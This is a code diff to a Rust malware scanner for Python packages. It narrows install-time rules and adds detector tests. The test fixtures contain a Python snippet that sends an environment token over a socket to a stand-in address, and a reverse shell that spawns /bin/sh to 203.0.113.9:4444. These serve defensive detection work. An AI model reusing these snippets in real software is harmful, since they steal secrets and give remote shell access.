@@ -167,7 +167,11 @@ fn cooccurrence<'a>(
     mode: AnalysisMode,
     targets: &'a [TaintSink],
 ) -> Vec<(ReachabilityPath, &'a TaintSink)> {
-    let sources = sources(pg, rule.sources);
+    // A phase root stands for the rule's phase only, exactly as the control search filters
+    // `pg.phases.roots`: without this, an `__init__.py` (Import root) satisfied PHX-INS-*.
+    let phase = rule.technique.typical_phase;
+    let mut sources = sources(pg, rule.sources);
+    sources.retain(|s| s.kind != TaintSourceKind::PhaseRoot || is_root_of_phase(pg, s, phase));
     let mut out = Vec::new();
     for sink in targets {
         // Only the first co-occurring source per sink: the predicate is "some source of the
@@ -200,6 +204,15 @@ fn cooccurrence<'a>(
         out.push((path, sink));
     }
     out
+}
+
+/// Whether a `PhaseRoot` source is a root of `phase`. The source carries only the root's
+/// call-graph node, so the root is found again by that node.
+fn is_root_of_phase(pg: &PackageGraph, source: &TaintSource, phase: ExecutionPhase) -> bool {
+    pg.phases
+        .roots
+        .iter()
+        .any(|r| r.phase == phase && pg.call_graph.node_of(r.symbol) == Some(source.node))
 }
 
 /// Every occurrence of the rule's source kinds, in canonical order.
@@ -336,6 +349,102 @@ mod tests {
         assert!(
             !d.iter().any(|f| f.rule.as_str() == "PHX-EXF-001"),
             "D: no path, no finding"
+        );
+    }
+
+    // The install rules in A and B mean "sink in an install file / install root" (§6). An
+    // `__init__.py` is an Import root: its module-level eval is not install-time execution,
+    // and a plain setup.py does not import it. Found on the test set, 2026-10-01.
+    #[test]
+    fn cooccurrence_install_rules_ignore_import_roots() {
+        let plain = "from setuptools import setup\nsetup(name='pkg')\n";
+        let g = graph(&[("setup.py", plain), ("pkg/__init__.py", "x = eval('1')\n")]);
+        for mode in [
+            AnalysisMode::FileCooccurrence,
+            AnalysisMode::DefinitionCooccurrence,
+        ] {
+            let found = evaluate(
+                &g,
+                &ScanOptions {
+                    mode,
+                    ..Default::default()
+                },
+            )
+            .unwrap();
+            assert!(
+                !found
+                    .iter()
+                    .any(|f| f.rule.as_str().starts_with("PHX-INS-")),
+                "{mode:?}: an import root is not an install root"
+            );
+        }
+        let g = graph(&[("setup.py", "x = eval('1')\n")]);
+        let b = evaluate(
+            &g,
+            &ScanOptions {
+                mode: AnalysisMode::DefinitionCooccurrence,
+                ..Default::default()
+            },
+        )
+        .unwrap();
+        assert!(
+            b.iter().any(|f| f.rule.as_str() == "PHX-INS-002"),
+            "B: eval in setup.py's own body still fires"
+        );
+    }
+
+    // A token sent over a socket held in a variable. Before ADR-025 `s.send` was named by
+    // its text and no `socket.socket.*` pattern could match it: no finding at all.
+    #[test]
+    fn exfiltration_over_a_socket_in_a_variable_fires() {
+        let src = "import os, socket\ndef beacon():\n    s = socket.socket()\n    s.connect(('203.0.113.9', 1))\n    s.send(os.environ['TOKEN'].encode())\n";
+        let g = graph(&[("pkg/__init__.py", src)]);
+        let d = evaluate(&g, &ScanOptions::default()).unwrap();
+        let ends: Vec<_> = d
+            .iter()
+            .filter(|f| f.rule.as_str() == "PHX-EXF-001")
+            .map(|f| {
+                (
+                    f.evidence.path.steps.last().map(|s| s.symbol.clone()),
+                    f.confidence,
+                )
+            })
+            .collect();
+        assert!(
+            ends.contains(&(
+                Some("socket.socket.send".to_owned()),
+                phylaxis_core::Confidence::Resolved
+            )),
+            "{ends:?}"
+        );
+    }
+
+    // The reverse shell kept on `self`, its socket opened in one method and used in another.
+    // The address reaches `dup2` through the typed attribute's receiver write.
+    #[test]
+    fn a_reverse_shell_held_on_self_fires() {
+        let src = "import os, pty, socket\n\
+                   class Shell:\n    def __init__(self):\n        self.link = None\n\
+                   \x20   def _open(self):\n        self.link = socket.socket()\n\
+                   \x20   def connect(self):\n        self._open()\n\
+                   \x20       self.link.connect(('203.0.113.9', 4444))\n\
+                   \x20       os.dup2(self.link.fileno(), 0)\n        pty.spawn('/bin/sh')\n";
+        let g = graph(&[("pkg/__init__.py", src)]);
+        let d = evaluate(
+            &g,
+            &ScanOptions {
+                mode: AnalysisMode::Reachability {
+                    phase_weighting: false,
+                },
+                ..Default::default()
+            },
+        )
+        .unwrap();
+        assert!(
+            d.iter().any(|f| f.rule.as_str() == "PHX-BKD-001"
+                && f.confidence == phylaxis_core::Confidence::Resolved),
+            "{:?}",
+            d.iter().map(|f| f.rule.as_str()).collect::<Vec<_>>()
         );
     }
 
